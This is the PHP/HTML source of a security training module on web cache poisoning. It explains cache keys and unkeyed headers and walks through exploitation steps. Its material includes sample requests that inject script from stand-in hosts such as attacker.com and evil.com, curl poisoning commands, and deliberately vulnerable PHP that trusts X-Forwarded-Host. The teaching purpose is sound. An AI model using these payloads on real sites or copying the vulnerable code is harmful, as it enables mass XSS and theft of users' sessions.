<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master Web Cache Poisoning vulnerabilities - Understanding cache manipulation attacks and implementing robust defenses. Complete cybersecurity training module.">
  <title>Web Cache Poisoning - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/cache-poisoning-info.css?v=1.1">
</head>

<body>
  <div class="grid-bg"></div>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Web Cache Poisoning</h1>
        <p class="page-subtitle">
          Master Web Cache Poisoning vulnerabilities - Learn how attackers manipulate caching layers to persistently
          serve malicious content to unsuspecting users. Understand cache key mechanisms and build defenses against this
          subtle but devastating attack.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is Web Cache Poisoning?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Web Cache Poisoning?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Web Cache Poisoning is an attack where an attacker manipulates a web cache to
          serve malicious or unauthorized content to other users. By exploiting discrepancies between how a cache
          identifies requests (cache key) and how the origin server processes them, attackers can "poison" cached
          responses that are then delivered to victims requesting the same resource.
        </div>

        <p class="text-content">
          Unlike traditional attacks that target a single user, cache poisoning is a "force multiplier"—one successful
          attack can affect thousands or millions of users requesting the poisoned resource. The attacker tricks the
          cache into storing a harmful response (containing XSS, JavaScript injection, or malicious redirects) and
          serving it to everyone else.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> Cache Poisoning transforms single-user vulnerabilities (like reflected
          XSS) into mass exploitation weapons. Affected users receive poisoned content without any suspicious URLs in
          their address bars, making detection extremely difficult. Impact scales with cache duration and traffic
          volume—potentially affecting entire user populations for hours or days.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div style="margin: 1rem 0;">
          <span class="severity-badge severity-high">CVSS 7.5-9.0 (High to Critical)</span>
        </div>
        <div class="highlight-box">
          <strong>CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector (AV):</strong> Network - Exploitable remotely</li>
            <li><strong>Attack Complexity (AC):</strong> High - Requires understanding cache behavior and crafting
              precise requests</li>
            <li><strong>Privileges Required (PR):</strong> None - No authentication needed</li>
            <li><strong>User Interaction (UI):</strong> Required - Victims must request poisoned resource</li>
            <li><strong>Scope (S):</strong> Changed - Cache serves poisoned content to all users</li>
            <li><strong>Impact:</strong> High Confidentiality/Integrity impact via XSS/data manipulation</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of Web Cache Poisoning</h3>
        <div class="cache-layer-grid">
          <div class="cache-layer-card">
            <div class="cache-layer-icon">🧪</div>
            <div class="cache-layer-name">Basic Poisoning</div>
            <div class="cache-layer-desc">Simple unkeyed input reflection into cached responses</div>
          </div>
          <div class="cache-layer-card">
            <div class="cache-layer-icon">🔀</div>
            <div class="cache-layer-name">Cache Key Injection</div>
            <div class="cache-layer-desc">Manipulating cache key components to create collisions</div>
          </div>
          <div class="cache-layer-card">
            <div class="cache-layer-icon">📦</div>
            <div class="cache-layer-name">HTTP Smuggling</div>
            <div class="cache-layer-desc">Desync attacks to poison via request tunneling</div>
          </div>
          <div class="cache-layer-card">
            <div class="cache-layer-icon">🎯</div>
            <div class="cache-layer-name">Fat GET</div>
            <div class="cache-layer-desc">Using body parameters to influence cache key calculation</div>
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 Cache Poisoning Attack Flow</div>
          <div class="attack-flow" style="margin: 0;">
            <div class="flow-step">
              <div class="flow-icon attack">🎯</div>
              <div class="flow-label">Attacker</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Sends malicious request with
                unkeyed header</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon server">⚙️</div>
              <div class="flow-label">Origin Server</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Processes header, reflects in
                response</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon cache">🧊</div>
              <div class="flow-label">Cache Stores</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Caches malicious response by
                key</p>
            </div>
            <div class="flow-step">
              <div class="flow-icon victim">👤</div>
              <div class="flow-label">Victims</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Receive poisoned content from
                cache</p>
            </div>
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How Web Cache Poisoning Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">The Cache Key Concept</h3>
        <p class="text-content">
          Caches use a "cache key" to identify stored responses—typically composed of the request method, host, and URL
          path. However, many HTTP headers and parameters are "unkeyed" (not part of the cache key) but still processed
          by the origin server. This discrepancy is the root of cache poisoning.
        </p>

        <div class="highlight-box">
          <strong>Cache Key Components (Usually):</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>HTTP method (GET, POST, etc.)</li>
            <li>Host header (example.com)</li>
            <li>Path and query string (/api/users?id=1)</li>
            <li>Scheme (http/https) - sometimes</li>
          </ul>
          <strong style="display: block; margin-top: 1rem;">Common Unkeyed Inputs (Dangerous):</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Headers: X-Forwarded-Host, X-Forwarded-Scheme, Origin, Referer</li>
            <li>Custom headers: X-Custom-Header, X-Debug</li>
            <li>Cookies (sometimes unkeyed)</li>
            <li>POST body (for GET requests - Fat GET)</li>
          </ul>
        </div>

        <h3 class="subsection-title">The Vulnerability Pattern</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Vulnerable Application Pattern</span></div>
          <pre><code><span class="code-comment">-- Attacker sends request:</span>
<span class="code-keyword">GET</span> <span class="code-string">/homepage</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">www.example.com</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">attacker.com</span>

<span class="code-comment">-- Origin server processes unkeyed header:</span>
<span class="code-keyword">&lt;?php</span>
<span class="code-keyword">$cdn_host</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_X_FORWARDED_HOST'</span>] ?? <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_HOST'</span>];
<span class="code-keyword">echo</span> <span class="code-string">"&lt;script src='https://"</span> . <span class="code-keyword">$cdn_host</span> . <span class="code-string">"/analytics.js'&gt;&lt;/script&gt;"</span>;
<span class="code-keyword">?&gt;</span>

<span class="code-comment">-- Response generated:</span>
<span class="code-tag">&lt;script</span> <span class="code-attr">src</span>=<span class="code-string">'https://attacker.com/analytics.js'</span><span class="code-tag">&gt;&lt;/script&gt;</span>

<span class="code-comment">-- Cache stores this response under key: GET www.example.com /homepage</span>
<span class="code-comment">-- Future victims receive attacker's script!</span></code></pre>
        </div>

        <h3 class="subsection-title">Cache Behavior Analysis</h3>
        <p class="text-content">
          Understanding how different caches handle requests is crucial. Cloudflare, Akamai, Varnish, and Nginx all have
          different default behaviors regarding what they include in cache keys.
        </p>

        <div class="info-box">
          <table class="http-header-table">
            <tr>
              <th>Cache System</th>
              <th>Default Key Components</th>
              <th>Common Unkeyed Headers</th>
            </tr>
            <tr>
              <td>Cloudflare</td>
              <td>Host + URL + Scheme</td>
              <td>Origin, Referer, X-Forwarded-*</td>
            </tr>
            <tr>
              <td>Akamai</td>
              <td>Configurable (usually Host + URL)</td>
              <td>All headers unless explicitly keyed</td>
            </tr>
            <tr>
              <td>Varnish</td>
              <td>Host + URL + Vary header</td>
              <td>User-Agent, Accept, Cookies (by default)</td>
            </tr>
            <tr>
              <td>Nginx (proxy_cache)</td>
              <td>$scheme$request_method$host$request_uri</td>
              <td>Custom headers unless configured</td>
            </tr>
            <tr>
              <td>AWS CloudFront</td>
              <td>Host + URL + Query string</td>
              <td>Headers not in cache policy</td>
            </tr>
          </table>
        </div>

        <h3 class="subsection-title">The "Fat GET" Technique</h3>
        <p class="text-content">
          Some caches treat GET requests with bodies as equivalent to GET without bodies, but the origin server may
          process the body parameters. This allows attackers to hide payload data from the cache key while still
          influencing the response.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Fat GET Exploitation</span></div>
          <pre><code><span class="code-comment">-- Attacker sends:</span>
<span class="code-keyword">GET</span> <span class="code-string">/search</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">example.com</span>
<span class="code-attr">Content-Length</span>: <span class="code-number">24</span>

<span class="code-string">query=&lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="code-comment">-- Cache key: GET example.com /search (body NOT included!)</span>
<span class="code-comment">-- Origin server reads $_POST['query'] or php://input</span>
<span class="code-comment">-- Response contains: &lt;div&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span>
<span class="code-comment">-- Cached and served to all search visitors!</span></code></pre>
        </div>

        <h3 class="subsection-title">HTTP Header Exploitation</h3>
        <p class="text-content">
          Headers designed for legitimate proxy/CDN functionality often become attack vectors when applications trust
          and reflect them without validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Dangerous Header Patterns</span></div>
          <pre><code><span class="code-comment">-- X-Forwarded-Host: Controls resource URLs</span>
<span class="code-keyword">GET</span> <span class="code-string">/api/config</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">evil.com</span>
<span class="code-comment">-- Response: {"api_endpoint": "https://evil.com/v2/data"}</span>

<span class="code-comment">-- X-Forwarded-Scheme: Forces HTTP/HTTPS in redirects</span>
<span class="code-keyword">GET</span> <span class="code-string">/login</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Scheme</span>: <span class="code-string">http</span>
<span class="code-comment">-- Response: Location: http://example.com/dashboard (downgrade attack)</span>

<span class="code-comment">-- Origin: CORS reflection</span>
<span class="code-keyword">GET</span> <span class="code-string">/data</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Origin</span>: <span class="code-string">https://attacker.com</span>
<span class="code-comment">-- Response: Access-Control-Allow-Origin: https://attacker.com</span>

<span class="code-comment">-- User-Agent: Sometimes reflected in cached JS/CSS</span>
<span class="code-keyword">GET</span> <span class="code-string">/assets/app.js</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">User-Agent</span>: <span class="code-string">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🔍</div>
            <div class="flow-label">Identify Unkeyed Inputs</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">ParamMiner/Burp finds headers
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🧪</div>
            <div class="flow-label">Test Reflection</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Confirm header reaches response
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon cache">🎯</div>
            <div class="flow-label">Craft Payload</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">XSS/Redirect injection</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">☠️</div>
            <div class="flow-label">Mass Exploitation</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">All cache hits affected</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting Cache Poisoning</h2>

        <h3 class="subsection-title">Step 1: Identify Cache Behavior</h3>
        <p class="text-content">
          First, determine if caching is present and how it behaves. Look for cache headers and timing differences.
        </p>

        <div class="highlight-box">
          <strong>Cache Detection Methods:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><code>CF-Cache-Status</code> (Cloudflare: HIT/MISS/DYNAMIC)</li>
            <li><code>X-Cache</code> (Akamai/Varnish: HIT/MISS)</li>
            <li><code>Age</code> header (seconds since cached)</li>
            <li><code>X-Timer</code> (Fastly)</li>
            <li><code>Server-Timing</code> (cache metrics)</li>
            <li>Timing analysis: Cache hits are faster than misses</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Cache Detection Script</span></div>
          <pre><code><span class="code-comment">-- Manual cache detection</span>
<span class="code-keyword">for</span> i <span class="code-keyword">in</span> {1..3}; <span class="code-keyword">do</span>
    curl -s -o /dev/null -w <span class="code-string">"%{time_total} %{http_code}\n"</span> \
         -H <span class="code-string">"Cache-Control: no-cache"</span> https://target.com/api/data
<span class="code-keyword">done</span>

<span class="code-comment">-- First request: 0.523s 200 (cache miss, fetched origin)</span>
<span class="code-comment">-- Second request: 0.089s 200 (cache hit, served from edge)</span>
<span class="code-comment">-- Third request: 0.087s 200 (cache hit)</span>

<span class="code-comment">-- Check cache headers</span>
<span class="code-keyword">curl</span> -I https://target.com/api/data | <span class="code-keyword">grep</span> -i cache</code></pre>
        </div>

        <h3 class="subsection-title">Step 2: Discover Unkeyed Inputs</h3>
        <p class="text-content">
          Use Burp Suite's ParamMiner extension or manual testing to find headers that affect the response but aren't
          part of the cache key.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">ParamMiner Configuration</span></div>
          <pre><code><span class="code-comment">-- Install ParamMiner from BApp Store</span>
<span class="code-comment">-- Target: Right-click request → Extensions → ParamMiner → Guess headers</span>

<span class="code-comment">-- Wordlist should include:</span>
Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Cookie
DNT
Expect
Forwarded
From
If-Match
If-Modified-Since
If-None-Match
If-Range
If-Unmodified-Since
Link
Max-Forwards
Origin
Pragma
Proxy-Authorization
Range
Referer
TE
Upgrade
User-Agent
Via
Warning
X-Api-Version
X-Att-Deviceid
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Scheme
X-Http-Method-Override
X-Proxy-User-Ip
X-Requested-With
X-Wap-Profile

<span class="code-comment">-- Look for: Response body changes without cache key changes</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Confirm Cache Key Exclusion</h3>
        <p class="text-content">
          Verify that the discovered header is truly unkeyed by sending two different values and checking if they return
          the same cached response.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Cache Key Verification</span></div>
          <pre><code><span class="code-comment">-- Step 1: Poison with first value</span>
<span class="code-keyword">curl</span> -H <span class="code-string">"X-Forwarded-Host: poison1.com"</span> \
     -H <span class="code-string">"Cache-Control: no-store"</span> \
     https://target.com/resource

<span class="code-comment">-- Step 2: Request without header (simulating victim)</span>
<span class="code-keyword">curl</span> -s https://target.com/resource | <span class="code-keyword">grep</span> poison1

<span class="code-comment">-- If poison1.com appears in victim response, header is unkeyed!</span>

<span class="code-comment">-- Step 3: Confirm with second poison value</span>
<span class="code-keyword">curl</span> -H <span class="code-string">"X-Forwarded-Host: poison2.com"</span> \
     https://target.com/resource

<span class="code-keyword">curl</span> -s https://target.com/resource | <span class="code-keyword">grep</span> poison2
<span class="code-comment">-- Should show poison2.com (confirms we can control content)</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Construct Malicious Payload</h3>
        <p class="text-content">
          Transform the unkeyed input reflection into a working exploit—typically XSS, open redirect, or JavaScript
          injection.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">XSS via X-Forwarded-Host</span></div>
          <pre><code><span class="code-comment">-- Scenario: Application uses header to generate script URLs</span>

<span class="code-comment">-- Step 1: Test reflection</span>
<span class="code-keyword">GET</span> <span class="code-string">/dashboard</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">test.example.com</span>

<span class="code-comment">-- Response contains:</span>
<span class="code-tag">&lt;script</span> <span class="code-attr">src</span>=<span class="code-string">"https://test.example.com/analytics.js"</span><span class="code-tag">&gt;&lt;/script&gt;</span>

<span class="code-comment">-- Step 2: Exploit with XSS</span>
<span class="code-keyword">GET</span> <span class="code-string">/dashboard</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">attacker.com/evil.js#"</span>&gt;&lt;script&gt;<span class="code-keyword">alert</span>(document.cookie)&lt;/script&gt;&lt;img src=<span class="code-string">"x</span>

<span class="code-comment">-- Or using data URI:</span>
<span class="code-keyword">GET</span> <span class="code-string">/dashboard</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Host</span>: <span class="code-string">attacker.com/api.js</span>
<span class="code-attr">X-Forwarded-Scheme</span>: <span class="code-string">data</span>

<span class="code-comment">-- Response becomes:</span>
<span class="code-tag">&lt;script</span> <span class="code-attr">src</span>=<span class="code-string">"data:text/javascript,alert(1)"</span><span class="code-tag">&gt;&lt;/script&gt;</span></code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Open Redirect via X-Forwarded-Scheme</span></div>
          <pre><code><span class="code-comment">-- Scenario: Login redirect uses scheme from header</span>

<span class="code-keyword">GET</span> <span class="code-string">/login?redirect=/dashboard</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Scheme</span>: <span class="code-string">https</span>

<span class="code-comment">-- Response:</span>
<span class="code-keyword">HTTP/1.1</span> <span class="code-number">302</span> Found
<span class="code-attr">Location</span>: <span class="code-string">https://example.com/dashboard</span>

<span class="code-comment">-- Attack: Downgrade to HTTP (credential theft)</span>
<span class="code-keyword">GET</span> <span class="code-string">/login?redirect=/dashboard</span> <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">X-Forwarded-Scheme</span>: <span class="code-string">http</span>

<span class="code-comment">-- Poisoned Response:</span>
<span class="code-keyword">HTTP/1.1</span> <span class="code-number">302</span> Found
<span class="code-attr">Location</span>: <span class="code-string">http://example.com/dashboard</span>  <span class="code-comment">-- MITM opportunity!</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Maximize Impact</h3>
        <p class="text-content">
          Target high-traffic endpoints and ensure cache persistence. Some caches respect Cache-Control from origin,
          others need explicit purging.
        </p>

        <div class="highlight-box">
          <strong>High-Value Targets for Poisoning:</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Homepage (<code>/</code>) - highest traffic</li>
            <li>Popular API endpoints (<code>/api/config</code>, <code>/api/user</code>)</li>
            <li>Static assets with dynamic generation (<code>/app.js</code>, <code>/config.json</code>)</li>
            <li>Search results pages (if cacheable)</li>
            <li>Error pages (often cached with aggressive TTL)</li>
          </ul>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Cache Poisoning Exploitation with Burp Suite</div>
          <div class="diagram-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step cache detection → unkeyed header discovery → payload crafting → mass
            exploitation demonstration]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious Cache Poisoning Attacks</h2>

        <h3 class="subsection-title">Case Study 1: Cloudflare XSS via Header Injection (2019)</h3>
        <p class="text-content">
          Security researcher James Kettle discovered that Cloudflare's edge servers could be poisoned via the
          <code>X-Forwarded-Host</code> header on customer websites. By sending a specially crafted request, he could
          inject JavaScript that would be served to all subsequent visitors of the affected page.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Affected any website using Cloudflare with specific vulnerable configurations. The
          attack allowed persistent XSS on high-traffic sites without touching the origin server. Cloudflare rapidly
          deployed fixes to their edge configuration.
        </div>

        <h3 class="subsection-title">Case Study 2: GitHub JavaScript Poisoning (2020)</h3>
        <p class="text-content">
          Researchers found that GitHub's raw file serving endpoint could be poisoned through the <code>Accept</code>
          header. By manipulating content negotiation headers, they caused the cache to serve JavaScript files with
          wrong Content-Type headers, leading to XSS in browsers that executed the poisoned files as HTML.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Malformed Accept header → Cache stores JS as text/html → Victims' browsers
          execute script → Session hijacking of developers accessing raw JS files.
        </div>

        <h3 class="subsection-title">Case Study 3: Mozilla Observatory Poisoning (2018)</h3>
        <p class="text-content">
          The Mozilla HTTP Observatory, a security scanning tool, was vulnerable to cache poisoning via the
          <code>Origin</code> header. Attackers could poison scan results, causing the tool to report false security
          scores for domains—potentially misleading security decisions.
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Reputational damage to security tool, potential for attackers to "greenwash"
          malicious sites by poisoning their scan results in the cache.
        </div>

        <h3 class="subsection-title">Case Study 4: StackOverflow Ad Script Poisoning</h3>
        <p class="text-content">
          StackOverflow's ad delivery scripts were found to be cache-poisonable via the <code>X-Forwarded-Host</code>
          header. An attacker could replace ad scripts with malicious code, potentially infecting millions of developers
          visiting the site.
        </p>
        <div class="danger-box">
          <strong>Scale:</strong> StackOverflow serves 100+ million daily impressions. A successful poison could persist
          for hours, affecting a significant portion of the global developer population with drive-by malware.
        </div>

        <h3 class="subsection-title">Industry Impact Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-orange);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SaaS/Cloud</td>
              <td style="padding: 0.75rem;">Poison API configuration endpoints</td>
              <td style="padding: 0.75rem;">Mass credential harvesting, account takeover</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Poison product pages with malicious scripts</td>
              <td style="padding: 0.75rem;">Payment data theft, cart manipulation</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">News/Media</td>
              <td style="padding: 0.75rem;">Poison article pages with propaganda/malware</td>
              <td style="padding: 0.75rem;">Misinformation spread, drive-by downloads</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Finance</td>
              <td style="padding: 0.75rem;">Poison login pages with credential skimmers</td>
              <td style="padding: 0.75rem;">Bank account compromise, wire fraud</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Government</td>
              <td style="padding: 0.75rem;">Poison information portals with disinformation</td>
              <td style="padding: 0.75rem;">Public safety impact, trust erosion</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper handling of proxy headers enables cache poisoning,
          then implement strict header validation, cache key normalization, and origin isolation.
        </div>

        <h3 class="subsection-title">Lab 1: Vulnerable Resource Loading (PHP)</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Using <code>X-Forwarded-Host</code> to construct resource URLs without
          validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Trusts X-Forwarded-Host for CDN URL construction</span>
<span class="code-keyword">class</span> <span class="code-function">AssetLoader</span> {
    <span class="code-keyword">public function</span> <span class="code-function">getAnalyticsScript</span>() {
        <span class="code-comment">// DANGEROUS: Uses unvalidated header</span>
        <span class="code-keyword">$host</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_X_FORWARDED_HOST'</span>] 
              ?? <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_HOST'</span>];
        
        <span class="code-keyword">return</span> <span class="code-string">"&lt;script src='https://"</span> . <span class="code-keyword">$host</span> . <span class="code-string">"/analytics.js'&gt;&lt;/script&gt;"</span>;
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">getApiEndpoint</span>() {
        <span class="code-comment">// DANGEROUS: Header used in API configuration</span>
        <span class="code-keyword">$scheme</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_X_FORWARDED_SCHEME'</span>] 
                 ?? <span class="code-string">'https'</span>;
        
        <span class="code-keyword">return</span> [
            <span class="code-string">'endpoint'</span> => <span class="code-keyword">$scheme</span> . <span class="code-string">'://api.'</span> . <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_HOST'</span>] . <span class="code-string">'/v2'</span>,
            <span class="code-string">'auth_url'</span> => <span class="code-keyword">$scheme</span> . <span class="code-string">'://auth.'</span> . <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_HOST'</span>] . <span class="code-string">'/token'</span>
        ];
    }
}

<span class="code-comment">// Attacker sends:</span>
<span class="code-comment">// GET /dashboard HTTP/1.1</span>
<span class="code-comment">// X-Forwarded-Host: evil.com#"></span><span class="code-tag">&lt;script&gt;</span><span class="code-keyword">alert</span>(1)<span class="code-tag">&lt;/script&gt;</span><span class="code-comment">&lt;img src="x</span>

<span class="code-comment">// Result: XSS payload cached and served to all users!</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">SecureAssetLoader</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$allowed_hosts</span>;
